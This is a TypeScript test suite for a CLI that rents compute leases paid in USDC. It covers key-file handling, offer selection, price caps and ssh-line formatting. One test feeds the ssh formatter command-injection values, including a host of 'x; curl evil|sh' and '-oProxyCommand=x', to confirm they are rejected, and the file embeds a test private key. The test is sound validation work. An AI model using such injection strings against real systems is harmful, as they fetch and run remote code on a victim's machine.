import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { privateKeyToAccount } from 'viem/accounts';
import { DEFAULT_DOOR, formatUsdc, runCli, sshLine, type CliDeps } from './cli.js';
import type { Answer, DoorClient } from './fund/door-client.js';

const KEY_HEX = '59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d';
const HOST = 'ab'.repeat(32);
const OTHER = 'cd'.repeat(32);
const LEASE = 'a'.repeat(32);

function keyFile(contents = `${KEY_HEX}\n`): string {
  const f = join(mkdtempSync(join(tmpdir(), 'charter-cli-')), 'payer.key');
  writeFileSync(f, contents);
  return f;
}

const offer = (id: string, over: Record<string, unknown> = {}) => ({
  offerId: id, cpu: 1, memoryMiB: 1024, intervalSeconds: 3600, tickPrice: '7000', images: ['charter-job-fetch', 'charter-home'],
  hiddenHost: false, hiddenEgress: false, expiresAt: 9_999_999_999_000, operator: 'independent', ...over,
});

interface FakeDoor {
  client: DoorClient;
  built: Array<{ doorUrl: string; key?: string; maxTickMicro: bigint }>;
  calls: string[];
  paid: unknown[];
}

/**
 * A door that lists `offers`, opens LEASE on POST /v1/leases, and keeps one lease whose host count starts at
 * `paidIntervals`. Each paid tick at the expected index counts one more and costs 7000.
 */
function fakeDoor(o: { offers?: unknown[]; paidIntervals?: number; clock: { t: number } }): FakeDoor {
  const calls: string[] = [];
  const paid: unknown[] = [];
  let count = o.paidIntervals ?? 0;
  let paidThrough: number | undefined = count > 0 ? o.clock.t : undefined;
  let state = count > 0 ? 'running' : 'awaiting_first_tick';
  const lease = () => ({ id: LEASE, offerId: `${HOST}:o1`, job: { image: 'charter-job-fetch', args: {} }, state, createdAt: 0, paidIntervals: count, ...(paidThrough ? { paidThrough } : {}) });
  const ok = (body: unknown): Answer => ({ status: 200, body });
  const client: DoorClient = {
    payTo: `0x${'2'.repeat(40)}`,
    get: async (path) => {
      calls.push(`GET ${path}`);
      if (path === '/v1/offers') return ok(o.offers ?? [offer(`${HOST}:o1`)]);
      if (path === `/v1/leases/${LEASE}`) return ok({ lease: lease(), stopped: false, offer: offer(`${HOST}:o1`) });
      return { status: 404, body: { error: 'not_found' } };
    },
    post: async (path, json) => (calls.push(`POST ${path} ${JSON.stringify(json)}`), ok({ leaseId: LEASE, state: 'awaiting_first_tick' })),
    pay: async (path, json) => {
      calls.push(`PAY ${path}`);
      paid.push(json);
      const index = (json as { index: number }).index;
      if (index !== count) return { status: 409, body: { error: 'out_of_order', expected: count } };
      count++;
      state = 'running';
      paidThrough = (paidThrough ?? o.clock.t) + 3_600_000;
      return { status: 200, body: { paidIntervals: count, paidThrough, duplicate: false }, paid: 7000n };
    },
    fund: async () => assert.fail('the CLI never calls fund'),
  };
  return { client, built: [], calls, paid };
}

async function cli(argv: string[], env: Record<string, string | undefined> = {}, door?: FakeDoor, clock = { t: 1_000_000 }) {
  const out: string[] = [];
  const err: string[] = [];
  const deps: Partial<CliDeps> = {
    out: (s) => out.push(s),
    err: (s) => err.push(s),
    now: () => clock.t,
    sleep: async (ms) => void (clock.t += ms),
    client: async (o) => {
      if (!door) assert.fail('no door client expected');
      door.built.push(o);
      return door.client;
    },
  };
  const code = await runCli(argv, env, deps);
  return { code, out: out.join('\n'), err: err.join('\n') };
}

test('rent without CHARTER_KEY_FILE exits 2 with usage', async () => {
  const r = await cli(['rent', '--urls', 'https://e.com', '--max-intervals', '1']);
  assert.equal(r.code, 2);
  assert.match(r.err, /CHARTER_KEY_FILE/);
  assert.match(r.err, /^usage:/m);
  assert.equal(r.out, '');
});

test('CHARTER_PAYER set prints that it is gone', async () => {
  const r = await cli(['renew', '--lease', LEASE, '--max-intervals', '1'], { CHARTER_PAYER: 'url', CHARTER_KEY_FILE: keyFile() });
  assert.equal(r.code, 2);
  assert.match(r.err, /CHARTER_PAYER is gone/);
  assert.match(r.err, /^usage:/m);
});

test('CHARTER_OFFER_JSON, --relay and `charter payer` are gone too: usage and exit 2, no door called', async () => {
  for (const [argv, env, says] of [
    [['offers'], { CHARTER_OFFER_JSON: '{}' }, /CHARTER_OFFER_JSON is gone/],
    [['offers', '--relay', 'wss://r'], {}, /--relay is gone/],
    [['payer'], {}, /charter payer is gone/],
    [[], {}, /^usage:/],
    [['nope'], {}, /^usage:/],
  ] as const) {
    const r = await cli([...argv], { ...env });
    assert.equal(r.code, 2, argv.join(' '));
    assert.match(r.err, says);
    assert.match(r.err, /^usage:/m);
  }
});

test('renew pays from the host\'s paid count', async () => {
  const clock = { t: 1_000_000 };
  const door = fakeDoor({ paidIntervals: 3, clock });
  const r = await cli(['renew', '--lease', LEASE, '--max-intervals', '1', '--json'], { CHARTER_KEY_FILE: keyFile() }, door, clock);
  assert.equal(r.code, 0, r.err);
  assert.deepEqual(door.paid, [{ index: 3 }]);
  const j = JSON.parse(r.out);
  assert.equal(j.leaseId, LEASE);
  assert.equal(j.paidIntervals, 4);
  assert.equal(j.spent, '7000');
  // The key file's hex key, with the default door and the default cap.
  assert.deepEqual(door.built, [{ doorUrl: DEFAULT_DOOR, key: `0x${KEY_HEX}`, maxTickMicro: 20000n }]);
});

test('renew --from that is not the host\'s count pays nothing and exits 2', async () => {
  const clock = { t: 1_000_000 };
  const door = fakeDoor({ paidIntervals: 3, clock });
  const r = await cli(['renew', '--lease', LEASE, '--from', '2', '--max-intervals', '1'], { CHARTER_KEY_FILE: keyFile() }, door, clock);
  assert.equal(r.code, 2);
  assert.match(r.err, /--from 2 does not match the host's paid intervals 3/);
  assert.deepEqual(door.paid, []);
});

test('rent with no --offer opens on the door\'s first offer that runs the job, even when a later one is cheaper, and pays from tick 0', async () => {
  const clock = { t: 1_000_000 };
  const door = fakeDoor({
    clock,
    offers: [offer(`${OTHER}:python`, { tickPrice: '1000', images: ['charter-job-python'] }), offer(`${HOST}:o1`), offer(`${OTHER}:cheap`, { tickPrice: '2000' })],
  });
  const r = await cli(['rent', '--urls', 'https://e.com/a,https://e.com/b', '--max-intervals', '2', '--json'], { CHARTER_KEY_FILE: keyFile(), CHARTER_DOOR_URL: 'https://door.example' }, door, clock);
  assert.equal(r.code, 0, r.err);
  assert.ok(door.calls.includes(`POST /v1/leases ${JSON.stringify({ offerId: `${HOST}:o1`, urls: ['https://e.com/a', 'https://e.com/b'] })}`), door.calls.join('\n'));
  assert.deepEqual(door.paid, [{ index: 0 }, { index: 1 }]);
  assert.equal(JSON.parse(r.out).spent, '14000');
  assert.equal(door.built[0]!.doorUrl, 'https://door.example');
});

test('I2: rent takes the first offer in the door\'s order it can use: never one over CHARTER_MAX_TICK, funding waiting, or (for a home) with no free slot', async () => {
  const keys = join(mkdtempSync(join(tmpdir(), 'charter-cli-')), 'keys.pub');
  writeFileSync(keys, 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl a@b\n');
  const offers = [
    offer(`${OTHER}:dear`, { tickPrice: '20000' }),
    offer(`${OTHER}:waiting`, { record: { funding: 'waiting' } }),
    offer(`${OTHER}:full`, { home: { diskGiB: 2, retentionDays: 7, slots: 1, free: 0 } }),
    offer(`${HOST}:o1`, { home: { diskGiB: 2, retentionDays: 7, slots: 1, free: 1 } }),
  ];
  const opened = async (args: string[]): Promise<string[]> => {
    const clock = { t: 1_000_000 };
    const door = fakeDoor({ clock, offers });
    const r = await cli(['rent', ...args, '--max-intervals', '1', '--json'], { CHARTER_KEY_FILE: keyFile(), CHARTER_MAX_TICK: '10000' }, door, clock);
    assert.equal(r.code, 0, r.err);
    return door.calls.filter((c) => c.startsWith('POST /v1/leases'));
  };
  const fetchOpen = await opened(['--urls', 'https://e.com']);
  assert.equal(fetchOpen.length, 1);
  assert.match(fetchOpen[0]!, new RegExp(`"offerId":"${OTHER}:full"`), 'a full home slot does not matter to a fetch job');
  const homeOpen = await opened(['--home', keys]);
  assert.equal(homeOpen.length, 1);
  assert.match(homeOpen[0]!, new RegExp(`"offerId":"${HOST}:o1"`));
  // Every usable offer over the cap: refused by price, nothing opened.
  const clock = { t: 1_000_000 };
  const door = fakeDoor({ clock, offers: [offers[0]!, offers[1]!] });
  const r = await cli(['rent', '--urls', 'https://e.com', '--max-intervals', '1'], { CHARTER_KEY_FILE: keyFile(), CHARTER_MAX_TICK: '10000' }, door, clock);
  assert.equal(r.code, 1);
  assert.match(r.err, /above CHARTER_MAX_TICK/);
  assert.ok(!door.calls.some((c) => c.startsWith('POST') || c.startsWith('PAY')));
});

test('rent refuses an offer dearer than CHARTER_MAX_TICK before opening anything', async () => {
  const clock = { t: 1_000_000 };
  const door = fakeDoor({ clock });
  const r = await cli(['rent', '--offer', `${HOST}:o1`, '--urls', 'https://e.com', '--max-intervals', '1', '--door', 'https://d.example'],
    { CHARTER_KEY_FILE: keyFile(), CHARTER_MAX_TICK: '5000' }, door, clock);
  assert.equal(r.code, 1);
  assert.match(r.err, /0\.007 USDC a tick, above CHARTER_MAX_TICK \(0\.005 USDC\)/);
  assert.ok(!door.calls.some((c) => c.startsWith('POST') || c.startsWith('PAY')));
  assert.equal(door.built[0]!.maxTickMicro, 5000n);
  assert.equal(door.built[0]!.doorUrl, 'https://d.example');
});

test('a key file that is not a hex key is refused without printing it', async () => {
  const r = await cli(['renew', '--lease', LEASE, '--max-intervals', '1'], { CHARTER_KEY_FILE: keyFile('not a key secret-ish\n') });
  assert.equal(r.code, 1);
  assert.match(r.err, /CHARTER_KEY_FILE \S+ must hold one hex private key/);
  assert.doesNotMatch(r.err, /secret-ish/);
});

test('offers lists what the door lists, with no key', async () => {
  const door = fakeDoor({ clock: { t: 0 }, offers: [offer(`${HOST}:o1`, { home: { diskGiB: 10, retentionDays: 7, slots: 2, free: 1 } })] });
  const r = await cli(['offers'], {}, door);
  assert.equal(r.code, 0, r.err);
  assert.match(r.out, new RegExp(`^${HOST}:o1  0\\.007 USDC per 3600s tick`));
  assert.match(r.out, /home 10 GiB, 1 of 2 free/);
  assert.equal(door.built[0]!.key, undefined);
});

test('status reads the lease from the door, with no key', async () => {
  const clock = { t: 1_000_000 };
  const door = fakeDoor({ paidIntervals: 2, clock });
  const r = await cli(['status', LEASE, '--json'], {}, door, clock);
  assert.equal(r.code, 0, r.err);
  assert.deepEqual(JSON.parse(r.out), { leaseId: LEASE, state: 'running', paidIntervals: 2, paidThrough: 1_000_000, offerId: `${HOST}:o1` });
  const missing = await cli(['status', 'f'.repeat(32)], {}, fakeDoor({ clock }));
  assert.equal(missing.code, 1);
  assert.match(missing.err, /404 not_found/);
});

test('address prints the key file\'s address', async () => {
  const r = await cli(['address'], { CHARTER_KEY_FILE: keyFile(`0x${KEY_HEX}`) });
  assert.equal(r.code, 0, r.err);
  assert.equal(r.out, privateKeyToAccount(`0x${KEY_HEX}`).address);
});

test('formatUsdc prints micro-USDC as a decimal', () => {
  assert.equal(formatUsdc(1_000_000n), '1');
  assert.equal(formatUsdc(5000n), '0.005');
});

test('public access prints ssh -p', () => {
  assert.equal(sshLine({ ssh: { host: '37.27.86.235', port: 22003, user: 'tenant' } }), 'ssh -p 22003 tenant@37.27.86.235');
});

test('onion access still prints the ProxyCommand line', () => {
  const host = `${'a'.repeat(56)}.anyone`;
  assert.equal(sshLine({ ssh: { host, port: 22, user: 'tenant' } }), `ssh -o ProxyCommand="nc -x 127.0.0.1:<your Anyone SOCKS port> %h %p" tenant@${host}`);
});

test('an invalid access prints no ssh line', () => {
  const ok = { host: '37.27.86.235', port: 22003, user: 'tenant' };
  for (const ssh of [
    { ...ok, host: 'x; curl evil|sh' },
    { ...ok, host: '-oProxyCommand=x' },
    { ...ok, host: 'foo.anyone' },
    { ...ok, port: 0 },
    { ...ok, port: 65536 },
    { ...ok, port: 22.5 },
    { ...ok, user: 'root' },
    { ...ok, host: `${'a'.repeat(56)}.anyone`, port: 2222 },
  ]) assert.equal(sshLine({ ssh }), undefined, JSON.stringify(ssh));
});

test('with no CHARTER_MAX_TICK the cap is 0.02 USDC: rent pays up to 20000 a tick', async () => {
  const clock = { t: 1_000_000 };
  const door = fakeDoor({ clock });
  await cli(['rent', '--offer', `${HOST}:o1`, '--urls', 'https://e.com', '--max-intervals', '1', '--door', 'https://d.example'],
    { CHARTER_KEY_FILE: keyFile() }, door, clock);
  assert.equal(door.built[0]!.maxTickMicro, 20_000n);
});
